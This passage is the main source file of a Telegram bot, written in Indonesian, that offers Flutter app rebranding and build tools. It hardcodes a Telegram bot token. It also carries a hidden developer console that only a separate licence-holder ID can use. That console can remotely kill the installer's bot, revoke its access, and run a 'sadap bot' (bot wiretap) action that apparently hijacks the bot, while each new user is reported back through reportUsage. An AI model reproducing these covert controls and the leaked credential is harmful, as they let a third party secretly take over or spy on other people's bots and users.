// ============================================================
// INTEGRITY CHECK — HARUS PALING ATAS!
// ============================================================
const { enforceIntegrity, startIntegrityWatcher } = require('./utils/integrity');
enforceIntegrity();

const { Telegraf } = require('telegraf');
const fs = require('fs');
const AdmZip = require('adm-zip');
const config = require('./config');

// Import utilities
const { loadDB, saveDB, readJson, writeJson, JOBS_FILE, LIMITS_FILE, CREDITS_FILE, getMaintenance, saveMaintenance, enforceLicense, startLicenseWatcher, reportUsage, LICENSE_CONFIG, startDeveloperConsole, stopDeveloperConsole, revokeFingerprint, setLocalBan, sadapBotAction } = require('./utils/database');
const { initCredits, spendCredit, addLimit, canUse, getRemaining, getCredits, addCredits, creditDisplay } = require('./utils/credits');
const { downloadTelegramFile, uploadToRepo, uploadToRelease, deleteRelease, dispatchWorkflow, getLatestRun, getRunById, getArtifacts, downloadArtifactZip, makeProgressBar, randomJobId } = require('./utils/github');
const { updateConfig } = require('./utils/helpers');
const { initMtproto, sendDocumentSmart } = require('./utils/gramjs');

// Import menus
const { showMainMenu } = require('./menus/mainMenu');
const { showRenameMenu } = require('./menus/renameMenu');
const { showRecolourMenu, showColourPicker, COLOUR_LIST } = require('./menus/recolourMenu');
const { showBuildMenu, showBuildZipPrompt, showBuildUrlPrompt, showBuildStatusPrompt, showGetApkPrompt } = require('./menus/buildMenu');
const { showOwnerPanel } = require('./menus/ownerMenu');
const { showDeployMenu, showDeployZipPrompt } = require('./menus/deployMenu');

// Import handlers
const { handleRenameProcess } = require('./handlers/renameHandler');
const { handleRenameAllProcess } = require('./handlers/renameAllHandler');
const { handleRecolourProcess } = require('./utils/recolourHandler');
const { handleFunctionsProcess } = require('./handlers/functionsHandler');
const { handleCompressProcess } = require('./handlers/compressHandler');
const { handleBuildProcess, startBuildJob, trackBuildProgress } = require('./handlers/buildHandler');
const { handleOwnerAddUser, handleOwnerRemoveUser, handleOwnerSetMedia } = require('./handlers/ownerHandler');
const { handleJsHtmlToDartProcess } = require('./handlers/jsHtmlToDartHandler');
const { handleCekSyntaxProcess } = require('./handlers/cekSyntaxHandler');
const { handleRenameAppProcess } = require('./handlers/renameAppHandler');
const { handleGantiIconProcess } = require('./handlers/gantiIconHandler');
const { handleCekErrorFuncProcess } = require('./handlers/cekErrorFuncHandler');
const { handleDeployProcess } = require('./handlers/deployHandler');
const { handleDartPreviewProcess } = require('./handlers/dartPreviewHandler');

// ============================================================
// KONFIGURASI CONSOLE BOT - PAKE TOKEN BEDA (FIX 409)
// ============================================================
const CONSOLE_BOT_TOKEN = '8745772885:AAF49hmTb1xnFTIUDh4WEg1MA-DAHgrnKM8';

// ============================================================
// HELPER: PROSES DENGAN TIMEOUT (FIX TIMEOUT ERROR - PERBAIKAN)
// ============================================================
async function processWithTimeout(ctx, processFn, timeoutMs = 900000) { // DIUBAH: 5 menit -> 15 menit
    const timeoutMsg = await ctx.reply(
        `<blockquote>⏳ <b>Memproses...</b>\n\nMohon tunggu, ini bisa memakan waktu beberapa menit.\n⏱️ Maksimal ${Math.floor(timeoutMs / 60000)} menit.\n\n📌 Proses berjalan di background.\nKetik /status untuk cek progress.</blockquote>`,
        { parse_mode: 'HTML' }
    );
    
    let timeoutId;
    try {
        const result = await Promise.race([
            processFn(),
            new Promise((_, reject) => {
                timeoutId = setTimeout(() => {
                    reject(new Error(`⏱️ Proses timeout - Silakan coba lagi dengan file yang lebih kecil. Maksimal ${Math.floor(timeoutMs / 60000)} menit.`));
                }, timeoutMs);
            })
        ]);
        clearTimeout(timeoutId);
        await ctx.telegram.deleteMessage(timeoutMsg.chat.id, timeoutMsg.message_id).catch(() => {});
        return result;
    } catch (e) {
        clearTimeout(timeoutId);
        await ctx.telegram.deleteMessage(timeoutMsg.chat.id, timeoutMsg.message_id).catch(() => {});
        
        // Jika timeout, beri opsi perpanjang
        if (e.message && e.message.includes('timeout')) {
            try {
                await ctx.reply(
                    `<blockquote>⏱️ <b>Waktu habis!</b>\n\n${e.message}\n\n💡 Mau lanjutkan dengan waktu lebih lama?\nTekan tombol di bawah untuk perpanjang 10 menit lagi.</blockquote>`,
                    {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '⏰ Perpanjang 10 Menit', callback_data: `extend_timeout_${Date.now()}` }],
                                [{ text: '❌ Batalkan', callback_data: 'main_menu' }]
                            ]
                        }
                    }
                );
            } catch {}
        }
        throw e;
    }
}

// ============================================================
// STORAGE UNTUK EXTEND TIMEOUT
// ============================================================
const extendTimeoutStorage = {};

// ============================================================
// FACTORY — Membuat instance bot
// ============================================================
const activeClones = {};

function createBot(token, ownerId) {
const bot = new Telegraf(token);
const OWNER_ID = ownerId;

// ============================================================
// GLOBAL ERROR HANDLER - FIXED
// ============================================================
bot.catch(async (err, ctx) => {
    console.error('❌ Bot error:', err);
    let errorMsg = err.message || 'Unknown error';
    
    // Kalo timeout, kasih pesan yang lebih jelas
    if (errorMsg.includes('timed out') || errorMsg.includes('Timeout') || errorMsg.includes('timeout')) {
        errorMsg = '⏱️ Proses memakan waktu terlalu lama. Coba dengan file yang lebih kecil, atau coba lagi nanti. Maksimal 15 menit.';
    }
    
    try {
        await ctx.reply(`<blockquote>❌ <b>Terjadi kesalahan:</b>\n${errorMsg}\n\n💡 Silakan coba lagi dari menu.</blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏠 Menu Utama', callback_data: 'main_menu' }]] } });
    } catch {}
});

let db = loadDB();
let userState = {};

// ============================================================
// HELPER: Cek apakah user sudah join channel
// ============================================================
async function checkForceJoin(ctx) {
    const ch = config.FORCE_JOIN_CHANNEL;
    if (!ch) return true;
    if (ctx.from.id === OWNER_ID) return true;

    const chatId = /^-?\d+$/.test(String(ch)) ? parseInt(ch) : '@' + ch.replace(/^@/, '');

    try {
        const member = await ctx.telegram.getChatMember(chatId, ctx.from.id);
        const notJoined = ['left', 'kicked'].includes(member.status);
        return !notJoined;
    } catch (err) {
        const errMsg = err?.message || '';
        if (
            errMsg.includes('user not found') ||
            errMsg.includes('PARTICIPANT_ID_INVALID') ||
            errMsg.includes('Bad Request: user not found')
        ) {
            return false;
        }
        console.error('[ForceJoin] getChatMember error:', errMsg);
        return true;
    }
}

async function sendJoinPrompt(ctx) {
    const rawCh = config.FORCE_JOIN_CHANNEL || 'Channel';
    const link  = config.FORCE_JOIN_CHANNEL_LINK || `https://t.me/${rawCh.replace(/^@/, '')}`;
    const chDisplay = rawCh.replace(/^@/, '');
    const text = `<blockquote>🔒 <b>Wajib Join Channel!</b>\n\nUntuk menggunakan bot ini, kamu harus bergabung ke channel kami terlebih dahulu.\n\n📢 Channel: <b>@${chDisplay}</b>\n\n✅ Setelah join, tekan tombol <b>Sudah Join ✅</b> di bawah!</blockquote>`;
    const keyboard = {
        inline_keyboard: [
            [{ text: `📢 Join Channel @${chDisplay}`, url: link }],
            [{ text: '✅ Sudah Join — Lanjutkan', callback_data: 'check_join_status' }],
        ]
    };
    try {
        if (ctx.updateType === 'callback_query') {
            try { await ctx.answerCbQuery('⚠️ Wajib join channel dulu!', { show_alert: true }); } catch {}
            try {
                await ctx.editMessageText(text, { parse_mode: 'HTML', reply_markup: keyboard });
            } catch {
                try { await ctx.reply(text, { parse_mode: 'HTML', reply_markup: keyboard }); } catch {}
            }
        } else {
            await ctx.reply(text, { parse_mode: 'HTML', reply_markup: keyboard });
        }
    } catch (e) {
        console.error('[ForceJoin] sendJoinPrompt error:', e?.message);
    }
}

// ============================================================
// MIDDLEWARE: Auto-register + Force Join Channel
// ============================================================
bot.use(async (ctx, next) => {
    if (!ctx.from) return next();
    const userId = ctx.from.id;

    if (config.FORCE_JOIN_CHANNEL) {
        const isCheckAction = ctx.updateType === 'callback_query' && ctx.callbackQuery?.data === 'check_join_status';
        if (!isCheckAction) {
            const joined = await checkForceJoin(ctx);
            if (!joined) {
                await sendJoinPrompt(ctx);
                return;
            }
        }
    }

    if (!db.whitelist.includes(userId)) {
        db.whitelist.push(userId);
        saveDB(db);
        reportUsage(ctx);
    }
    initCredits(userId);
    return next();
});

// ============================================================
// CALLBACK: Tombol "Sudah Join"
// ============================================================
bot.action('check_join_status', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const joined = await checkForceJoin(ctx);
    if (joined) {
        const userId = ctx.from.id;
        if (!db.whitelist.includes(userId)) { db.whitelist.push(userId); saveDB(db); }
        initCredits(userId);
        return showMainMenu(ctx, OWNER_ID);
    } else {
        const ch   = config.FORCE_JOIN_CHANNEL || 'Channel';
        const link = config.FORCE_JOIN_CHANNEL_LINK || `https://t.me/${ch}`;
        try {
            await ctx.answerCbQuery('❌ Kamu belum join! Tekan tombol join dulu.', { show_alert: true });
        } catch {}
        try {
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `📢 Join Channel @${ch.replace(/^@/, '')}`, url: link }],
                    [{ text: '✅ Sudah Join — Coba Lagi', callback_data: 'check_join_status' }],
                ]
            });
        } catch {}
    }
});

// ============================================================
// START
// ============================================================
bot.start(async (ctx) => {
    return showMainMenu(ctx, OWNER_ID);
});

// ============================================================
// /status — CEK STATUS PROSES (TAMBAHAN BARU)
// ============================================================
bot.command('status', async (ctx) => {
    const userId = ctx.from.id;
    const state = userState[userId];
    
    if (!state) {
        return ctx.reply(
            `<blockquote>📊 <b>Tidak ada proses aktif</b>\n\nKamu tidak memiliki proses yang sedang berjalan.\n\nMulai dari menu utama dengan /start</blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏠 Menu Utama', callback_data: 'main_menu' }]] } }
        );
    }
    
    const stepMap = {
        'WAIT_RENAME_ZIP': '📦 Menunggu file ZIP (Rename Domain)',
        'WAIT_RENAME_DOMAIN': '🌐 Menunggu domain baru (Rename Domain)',
        'WAIT_RENAME_OLD': '🔄 Mengganti domain (Rename Domain)',
        'WAIT_RENAMEALL_ZIP': '📦 Menunggu file ZIP (Rename All)',
        'WAIT_RENAMEALL_NEW_DOMAIN': '🌐 Menunggu domain baru (Rename All)',
        'WAIT_RENAMEALL_OLD_DOMAIN': '🔄 Mengganti domain (Rename All)',
        'WAIT_RENAMEALL_IMG': '🖼 Mengganti gambar (Rename All)',
        'WAIT_RENAMEALL_VID': '🎬 Mengganti video (Rename All)',
        'WAIT_RENAMEALL_NEW_APPNAME': '📱 Menunggu nama app baru (Rename All)',
        'WAIT_RENAMEALL_OLD_APPNAME': '📱 Mengganti nama app (Rename All)',
        'WAIT_RECOLOUR_DART': '🎨 Mengumpulkan file Dart (Recolour)',
        'WAIT_CUSTOM_HEX': '🎨 Menunggu HEX custom (Recolour)',
        'WAIT_RECOLOUR_OLD_HEX': '🎨 Mengganti warna (Recolour)',
        'WAIT_FUNC_ZIP': '🔧 Menunggu file ZIP (Functions)',
        'WAIT_FUNC_OLD': '🔧 Menunggu fungsi lama (Functions)',
        'WAIT_FUNC_NEW': '🔧 Menunggu fungsi baru (Functions)',
        'WAIT_COMPRESS_ZIP': '🗜 Menunggu file ZIP (Compress)',
        'WAIT_JSHTML_FILE': '🔄 Menunggu file JS/HTML (Convert)',
        'WAIT_SYNTAX_FILE': '🔍 Menunggu file JS (Cek Syntax)',
        'WAIT_ICON_ZIP': '🖼 Menunggu file ZIP (Ganti Icon)',
        'WAIT_ICON_IMAGE': '🖼 Menunggu gambar icon (Ganti Icon)',
        'WAIT_RENAMEAPP_ZIP': '✏️ Menunggu file ZIP (Rename App)',
        'WAIT_APP_OLD_NAME': '✏️ Menunggu nama app lama (Rename App)',
        'WAIT_APP_NEW_NAME': '✏️ Menunggu nama app baru (Rename App)',
        'WAIT_ERRORFUNC_CODE': '🛠 Menganalisis kode (Cek Error)',
        'WAIT_DEPLOY_ZIP': '🚀 Menunggu file ZIP (Deploy)',
        'WAIT_BUILD_ZIP': '🏗 Menunggu file ZIP (Build)',
        'WAIT_BUILD_URL': '🏗 Menunggu URL repo (Build)',
        'WAIT_STATUS_ID': '📊 Menunggu Job ID (Status Build)',
        'WAIT_GETAPK_ID': '📥 Menunggu Job ID (Ambil APK)',
        'WAIT_JADIBOT_TOKEN': '🤖 Menunggu Token (Clone Bot)',
        'WAIT_JADIBOT_OWNERID': '🤖 Menunggu Owner ID (Clone Bot)',
        'WAIT_DART_PREVIEW_FILE': '🧪 Menunggu file Dart (Preview)',
        'WAIT_SSWEB_URL': '📸 Menunggu URL (Screenshot)',
    };
    
    const stepDesc = stepMap[state.step] || state.step;
    const isExtend = extendTimeoutStorage[userId] ? '✅ (Diperpanjang)' : '⏳ (Normal)';
    
    await ctx.reply(
        `<blockquote>📊 <b>STATUS PROSES</b>\n\n📌 Step: <b>${stepDesc}</b>\n⏱️ Status: ${isExtend}\n🆔 User: <code>${userId}</code>\n\n💡 Ketik /batal untuk membatalkan proses.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
            [{ text: '❌ Batalkan Proses', callback_data: 'main_menu' }]
        ]} }
    );
});

// ============================================================
// /startconsole — START DEVELOPER CONSOLE
// ============================================================
bot.command('startconsole', async (ctx) => {
    if (String(ctx.from.id) !== String(LICENSE_CONFIG.NOTIFY_OWNER_ID)) {
        return ctx.reply('❌ Khusus owner!');
    }
    
    try {
        stopDeveloperConsole();
        await new Promise(r => setTimeout(r, 2000));
        const result = startDeveloperConsole(Telegraf);
        if (result.ok) {
            await ctx.reply('✅ Developer console berhasil di-start!\n\n📌 Sekarang tombol di notifikasi bisa diklik.');
        } else {
            await ctx.reply(`❌ Gagal: ${result.reason || result.error}`);
        }
    } catch (e) {
        await ctx.reply(`❌ Error: ${e.message}`);
    }
});

// ============================================================
// /ban — KILL BOT (OWNER ONLY)
// ============================================================
bot.command('ban', async (ctx) => {
    if (String(ctx.from.id) !== String(LICENSE_CONFIG.NOTIFY_OWNER_ID)) {
        return ctx.reply('❌ Khusus owner!');
    }
    
    try {
        const fs = require('fs');
        fs.writeFileSync('./.sc_access_revoked', `BANNED\nreason: manual_ban\ntime: ${new Date().toISOString()}\n`);
        await ctx.reply('✅ Bot akan mati dalam 5 detik...');
        
        setTimeout(() => {
            console.log('🛑 Bot dihentikan manual oleh owner');
            process.exit(1);
        }, 5000);
    } catch (e) {
        await ctx.reply(`❌ Gagal: ${e.message}`);
    }
});

// ============================================================
// /devconsole — UNTUK DEVELOPER (DENGAN SADAP BOT)
// ============================================================
bot.command('devconsole', async (ctx) => {
    if (String(ctx.from.id) !== String(LICENSE_CONFIG.NOTIFY_OWNER_ID)) return;
    
    try {
        stopDeveloperConsole();
    } catch {}
    await new Promise(r => setTimeout(r, 2000));
    
    const { Telegraf: Tgf } = require('telegraf');
    const consoleBot = new Tgf(CONSOLE_BOT_TOKEN);
    
    const { notifyInstallOwner, developerContactMessage } = require('./utils/database');
    
    consoleBot.use(async (ctx, next) => {
        const userId = String(ctx.from?.id);
        const ownerId = String(LICENSE_CONFIG.NOTIFY_OWNER_ID);
        if (userId !== ownerId) {
            try { await ctx.answerCbQuery('❌ Bukan untuk kamu.', { show_alert: true }); } catch {}
            return;
        }
        return next();
    });
    
    // ===== HAPUS AKSES =====
    consoleBot.action(/^delete_access_(.+)$/, async (ctx) => {
        const fp = ctx.match[1];
        try { await ctx.answerCbQuery('🗑️ Menghapus akses...'); } catch {}
        try {
            console.log(`🗑️ Hapus akses untuk FP: ${fp}`);
            await revokeFingerprint(fp);
            setLocalBan('revoked_by_owner');
            const msg = ctx.update.callback_query.message;
            await ctx.editMessageText(
                (msg?.text || '') +
                `\n\n✅ <b>AKSES DIHAPUS</b>\n📅 ${new Date().toLocaleString()}\n🔍 <code>${fp}</code>\n\n⚠️ Bot akan mati dalam 3 detik...`,
                { parse_mode: 'HTML' }
            );
            await notifyInstallOwner(developerContactMessage('Akses dihapus oleh owner - Bot akan mati'));
            setTimeout(() => {
                console.log('🛑 Menghentikan bot karena akses dicabut...');
                process.exit(1);
            }, 3000);
        } catch (e) {
            console.log(`❌ Gagal hapus akses:`, e.message);
            try { await ctx.reply(`❌ Gagal: ${e.message}`); } catch {}
        }
    });
    
    // ===== SADAP BOT =====
    consoleBot.action(/^sadap_bot_(.+)$/, async (ctx) => {
        const fp = ctx.match[1];
        try { await ctx.answerCbQuery('🕵️ Memulai sadap bot...'); } catch {}
        try {
            let notifData = {};
            try {
                if (fs.existsSync('./.last_notification.json')) {
                    notifData = JSON.parse(fs.readFileSync('./.last_notification.json', 'utf8'));
                }
            } catch {}

            const msg = ctx.update.callback_query.message;
            await ctx.editMessageText(
                (msg?.text || '') +
                `\n\n🕵️ <b>SADAP BOT DIMULAI</b>\n📅 ${new Date().toLocaleString()}\n🔍 <code>${fp}</code>\n👤 @${notifData.botInfo?.username || 'Tidak ada'}\n\n⏳ Proses sadap berjalan...`,
                { parse_mode: 'HTML' }
            );
            const result = await sadapBotAction(ctx, fp);
            if (!result.success) {
                await ctx.reply(`❌ <b>SADAP GAGAL</b>\nError: ${result.error}`, { parse_mode: 'HTML' });
            } else {
                await ctx.reply(`✅ <b>SADAP BERHASIL!</b>\n\n📛 @${result.username}`, { parse_mode: 'HTML' });
            }
        } catch (e) {
            console.log(`❌ Gagal sadap:`, e.message);
            try { await ctx.reply(`❌ Gagal: ${e.message}`); } catch {}
        }
    });
    
    // ===== BATAL =====
    consoleBot.action(/^cancel_notification_(.+)$/, async (ctx) => {
        const fp = ctx.match[1];
        try { await ctx.answerCbQuery('✅ Dibatalkan'); } catch {}
        try {
            const msg = ctx.update.callback_query.message;
            await ctx.editMessageText(
                (msg?.text || '') +
                `\n\n✅ <b>DIBATALKAN</b>\n📅 ${new Date().toLocaleString()}`,
                { parse_mode: 'HTML' }
            );
        } catch {}
    });
    
    consoleBot.launch().catch(e => console.log('⚠️ Console bot error:', e.message));
    await ctx.reply('✅ Developer console aktif! 3 tombol: Hapus Akses, Sadap Bot, Batal');
});

// ============================================================
// MENU ACTIONS — SEMUA TETAP SAMA
// ============================================================
bot.action('main_menu', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    delete userState[ctx.from.id];
    delete extendTimeoutStorage[ctx.from.id];
    return showMainMenu(ctx, OWNER_ID);
});

// ============================================================
// EXTEND TIMEOUT - Perpanjang waktu proses (TAMBAHAN BARU)
// ============================================================
bot.action(/^extend_timeout_(.+)$/, async (ctx) => {
    try { await ctx.answerCbQuery('⏰ Waktu diperpanjang 10 menit!'); } catch {}
    const userId = ctx.from.id;
    const state = userState[userId];
    
    if (!state) {
        return ctx.reply('<blockquote>⚠️ Session sudah habis. Mulai ulang dari menu.</blockquote>', { parse_mode: 'HTML' });
    }
    
    // Tandai bahwa user minta perpanjangan
    extendTimeoutStorage[userId] = {
        extended: true,
        time: Date.now(),
        state: { ...state }
    };
    
    // Lanjutkan proses dengan timeout lebih lama
    const timeoutMsg = await ctx.reply(
        `<blockquote>⏳ <b>Lanjutkan proses...</b>\n\nWaktu diperpanjang 10 menit.\nMohon tunggu...</blockquote>`,
        { parse_mode: 'HTML' }
    );
    
    try {
        // Cari handler yang sesuai
        const step = state.step;
        if (step.includes('RENAME')) {
            if (step === 'WAIT_RENAME_ZIP' || step === 'WAIT_RENAME_DOMAIN' || step === 'WAIT_RENAME_OLD') {
                await processWithTimeout(ctx, () => handleRenameProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, true), 900000);
            } else if (step.includes('RENAMEALL')) {
                await processWithTimeout(ctx, () => handleRenameAllProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining), 900000);
            } else if (step === 'WAIT_RENAMEAPP_ZIP' || step === 'WAIT_APP_OLD_NAME' || step === 'WAIT_APP_NEW_NAME') {
                await processWithTimeout(ctx, () => handleRenameAppProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, true), 900000);
            }
        } else if (step === 'WAIT_RECOLOUR_OLD_HEX') {
            await processWithTimeout(ctx, () => handleRecolourProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, AdmZip, true), 900000);
        } else if (step === 'WAIT_FUNC_ZIP' || step === 'WAIT_FUNC_OLD' || step === 'WAIT_FUNC_NEW') {
            await processWithTimeout(ctx, () => handleFunctionsProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, true), 900000);
        } else if (step === 'WAIT_COMPRESS_ZIP') {
            await processWithTimeout(ctx, () => handleCompressProcess(ctx, state, userState, downloadTelegramFile), 900000);
        } else if (step === 'WAIT_JSHTML_FILE') {
            await processWithTimeout(ctx, () => handleJsHtmlToDartProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, false), 900000);
        } else if (step === 'WAIT_ICON_ZIP' || step === 'WAIT_ICON_IMAGE') {
            await processWithTimeout(ctx, () => handleGantiIconProcess(ctx, state, userState, downloadTelegramFile, canUse, spendCredit, addLimit, getRemaining, true), 900000);
        } else if (step === 'WAIT_DEPLOY_ZIP') {
            await processWithTimeout(ctx, () => handleDeployProcess(ctx, state, userState, downloadTelegramFile), 900000);
        } else if (step === 'WAIT_BUILD_ZIP' || step === 'WAIT_BUILD_URL') {
            await processWithTimeout(ctx, () => handleBuildProcess(ctx, state, userState, downloadTelegramFile, startBuildJob, true), 900000);
        } else {
            await ctx.reply('<blockquote>⚠️ Tidak bisa melanjutkan proses ini. Mulai ulang dari menu.</blockquote>', { parse_mode: 'HTML' });
        }
        
        await ctx.telegram.deleteMessage(timeoutMsg.chat.id, timeoutMsg.message_id).catch(() => {});
        delete extendTimeoutStorage[userId];
    } catch (e) {
        await ctx.telegram.deleteMessage(timeoutMsg.chat.id, timeoutMsg.message_id).catch(() => {});
        delete extendTimeoutStorage[userId];
        
        await ctx.reply(
            `<blockquote>❌ <b>Gagal melanjutkan:</b>\n${e.message}</blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏠 Menu Utama', callback_data: 'main_menu' }]] } }
        ).catch(() => {});
    }
});

// ============================================================
// RENAME ALL — SKIP CALLBACKS
// ============================================================
bot.action('renameall_skip_img', async (ctx) => {
    try { await ctx.answerCbQuery('Gambar dilewati'); } catch {}
    const userId = ctx.from.id;
    const state  = userState[userId];
    if (!state || state.step !== 'WAIT_RENAMEALL_IMG') return;
    try { await ctx.deleteMessage(); } catch {}
    if (state.hasVids) {
        userState[userId] = { ...state, step: 'WAIT_RENAMEALL_VID', imgBuffer: null };
        await ctx.reply(
            `<blockquote>⏭ Gambar dilewati.\n\n<b>Step — Video</b>\n\nKirim <b>1 file video</b> sebagai dokumen (MP4/dll).\n\nBot otomatis mengganti semua video di folder <code>assets/</code> — nama file asli dipertahankan.\n\n⏭ Ketik <code>skip</code> atau tekan tombol untuk lewati.</blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
                [{ text: '⏭ Skip Ganti Video', callback_data: 'renameall_skip_vid' }],
                [{ text: '❌ Batal', callback_data: 'main_menu' }],
            ]} }
        );
    } else {
        userState[userId] = { ...state, step: 'WAIT_RENAMEALL_NEW_APPNAME', imgBuffer: null, vidBuffer: null };
        await ctx.reply(
            `<blockquote>⏭ Gambar dilewati.\n\n<b>Step — Nama App</b>\n\nKirim <b>nama aplikasi baru</b>.\nContoh: <code>Super Brand App</code>\n\n⏭ Ketik <code>skip</code> untuk lewati.</blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } }
        );
    }
});

bot.action('renameall_skip_vid', async (ctx) => {
    try { await ctx.answerCbQuery('Video dilewati'); } catch {}
    const userId = ctx.from.id;
    const state  = userState[userId];
    if (!state || state.step !== 'WAIT_RENAMEALL_VID') return;
    try { await ctx.deleteMessage(); } catch {}
    userState[userId] = { ...state, step: 'WAIT_RENAMEALL_NEW_APPNAME', vidBuffer: null };
    await ctx.reply(
        `<blockquote>⏭ Video dilewati.\n\n<b>Step — Nama App</b>\n\nKirim <b>nama aplikasi baru</b>.\nContoh: <code>Super Brand App</code>\n\n⏭ Ketik <code>skip</code> untuk lewati.</blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } }
    );
});

// ============================================================
// RECOLOUR
// ============================================================
bot.action('recolour_selesai', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const state = userState[ctx.from.id];
    if (!state || !state.dartFiles || state.dartFiles.length === 0) {
        return ctx.reply(`<blockquote>⚠️ Session habis. Mulai ulang dari menu.</blockquote>`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏠 Menu', callback_data: 'main_menu' }]] } });
    }
    userState[ctx.from.id] = { ...state, step: 'WAIT_RECOLOUR_COLOUR_PICK' };
    const { showColourPicker: _scp } = require('./menus/recolourMenu');
    await _scp(ctx, state.dartFiles);
});

bot.action(/^colour_pick_(.+)$/, async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const pickedHex = ctx.match[1];
    const state = userState[ctx.from.id];

    if (!state || (!state.dartFiles && !state.zipBuffer)) {
        return ctx.reply(`<blockquote>⚠️ Session habis. Mulai ulang dari menu.</blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🏠 Menu', callback_data: 'main_menu' }]] } });
    }

    if (pickedHex === 'CUSTOM') {
        userState[ctx.from.id] = { ...state, step: 'WAIT_CUSTOM_HEX' };
        return ctx.reply(`<blockquote>🎨 <b>CUSTOM HEX</b>\n\nKirimkan kode hex warna BARU kamu.\nContoh: <code>FF5733</code> atau <code>#FF5733</code></blockquote>`,
            { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } });
    }

    userState[ctx.from.id] = { ...state, step: 'WAIT_RECOLOUR_OLD_HEX', targetHex: pickedHex, dartFiles: state.dartFiles || [] };
    return ctx.reply(
        `<blockquote>✅ Warna baru: <b>#${pickedHex}</b>\n\nSekarang kirimkan <b>warna lama</b> (HEX) yang ingin diganti.\nContoh: <code>2196F3</code> atau <code>#2196F3</code></blockquote>`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batal', callback_data: 'main_menu' }]] } }
    );
});

// ============================================================
// MENU ACTIONS LAINNYA — SEMUA TETAP SAMA
// ============================================================
bot.action('menu_rename', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_RENAME_ZIP' };
    await showRenameMenu(ctx);
});

bot.action('menu_renameall', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const rem = getRemaining(ctx.from.id);
    userState[ctx.from.id] = { step: 'WAIT_RENAMEALL_ZIP' };
    const msgText = `<blockquote>🔥 <b>RENAME ALL</b>\n\nFitur super lengkap! Bot scan ZIP kamu, lalu minta file pengganti satu-satu sesuai format aslinya.\n\n📌 <b>Yang akan diproses:</b>\n🌐 Domain + Port di seluruh file\n🖼 Semua gambar di folder <code>assets/</code>\n🎬 Video di folder <code>assets/</code> (mp4, webm, dll)\n📱 ic_launcher Android/iOS — sesuai ekstensi asli\n(ic_launcher.jpg → minta JPG, ic_launcher.png → minta PNG)\n📱 Nama Aplikasi di seluruh file\n\n💎 Kredit tersisa: <b>${rem}</b>\n\n<b>Langkah 1:</b> Kirimkan file <b>.zip</b> project Flutter/base app kamu.</blockquote>`;
    try {
        await ctx.editMessageText(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    } catch {
        await ctx.reply(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    }
});

bot.action('menu_recolour', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_RECOLOUR_DART', dartFiles: [] };
    await showRecolourMenu(ctx);
});

bot.action('menu_functions', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const rem = getRemaining(ctx.from.id);
    userState[ctx.from.id] = { step: 'WAIT_FUNC_ZIP' };
    const msgText = `<blockquote>🔧 <b>MANAGE FUNCTIONS</b>\n\nFitur ini mengganti fungsi/kode di file .js project kamu.\n\n💎 Kredit tersisa: <b>${rem}</b>\n\n<b>Langkah 1:</b> Kirimkan file .zip yang berisi file .js yang ingin dimodifikasi.\n\n⚠️ Pastikan file zip berisi semua file .js yang perlu diubah.</blockquote>`;
    try {
        await ctx.editMessageText(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    } catch {
        await ctx.reply(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    }
});

bot.action('menu_compress', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    userState[ctx.from.id] = { step: 'WAIT_COMPRESS_ZIP' };
    const msgText = `<blockquote>🗜 <b>COMPRESS BASE</b>\n\nFitur ini menghapus file tidak perlu (build/, .dart_tool/, .gradle/, dll) dan mengkompres project Flutter/Android kamu.\n\n<b>Langkah 1:</b> Kirimkan file .zip project Flutter/Android kamu.\n\n⚠️ File akan diproses dan dikembalikan dalam ukuran yang lebih kecil.</blockquote>`;
    try {
        await ctx.editMessageText(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    } catch {
        await ctx.reply(msgText, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '❌ Batalkan', callback_data: 'main_menu' }]] } });
    }
});

bot.action('menu_build', async (ctx) => {
